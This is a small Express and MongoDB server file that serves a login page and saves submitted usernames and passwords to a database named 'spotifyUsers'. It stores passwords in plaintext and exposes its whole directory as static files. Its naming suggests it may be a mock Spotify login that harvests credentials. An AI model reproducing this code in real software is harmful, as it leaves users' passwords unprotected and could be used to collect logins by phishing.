const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const port = 3019;

const app = express();

mongoose.connect('mongodb://127.0.0.1:27017/spotifyUsers', { useNewUrlParser: true, useUnifiedTopology: true });

const db = mongoose.connection;

db.on('error', (error) => {
    console.error('Error connecting to MongoDB:', error);
});

db.once('open', () => {
    console.log("Mongodb connected");
});

app.use(express.static(__dirname));
app.use(express.urlencoded({ extended: true }));

const userSchema = new mongoose.Schema({
    user: String,
    pass: String
});

const Users = mongoose.model("data", userSchema);

app.listen(port, () => {
    console.log("Server has started");
});

app.post('/post', async (req, res) => {
    const { user, pass } = req.body;
    try {
        const newUser = new Users({ user, pass });
        await newUser.save();
        res.redirect('/success');
    } catch (err) {
        console.error(err);
        res.send('Error saving user to the database.');
    }
});

app.get('/success', (req, res) => {
    res.sendFile(path.join(__dirname, 'page.html'));
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});
